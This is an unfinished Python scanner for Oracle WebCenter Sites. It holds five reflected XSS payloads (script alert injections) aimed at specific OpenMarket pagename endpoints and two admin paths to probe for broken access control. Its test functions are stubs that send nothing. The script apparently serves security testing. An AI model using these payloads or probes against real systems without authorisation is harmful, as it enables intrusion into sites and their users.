import argparse

import requests

parser = argparse.ArgumentParser(description="WebCenter Sites vulnerability scanner")
parser.add_argument("url", action="store")
args = parser.parse_args()

# Parse URL
satellite = "/cs/Satellite"
satellite_len = len(satellite)
try:
    satellite_index = args.url.index(satellite)
    url = args.url[:satellite_index + satellite_len]
except ValueError:
    url = args.url.rstrip("/") + satellite

print(f"[!] Start scanning {url}")


def test_xss():
    check_str = "<script>alert(24)</script>"
    payloads = [
        'c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq"><script>alert(24)</script>',
        'destpage="<h1xxx<scriptalert(24)</script&pagename=OpenMarket/Xcelerate/UIFramework/LoginError',
        'c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(24)</script>',
        'pagename=OpenMarket/Xcelerate/Actions/Security/NoXceleditor&WemUI=qqq%27;}</script><script>alert(24)</script>',
        'pagename=OpenMarket/Xcelerate/Actions/Security/ProcessLoginRequest&WemUI=qqq%27;}</script><script>alert(24)</script>'
    ]
    for p in payloads:
        pass


def test_broken_acl():
    private_addresses = [
        'pagename=OpenMarket/Xcelerate/Admin/WebReferences',
        'pagename=OpenMarket/Xcelerate/Admin/Slots'
    ]
    for pa in private_addresses:
        pass


def test_sqli():
    pass





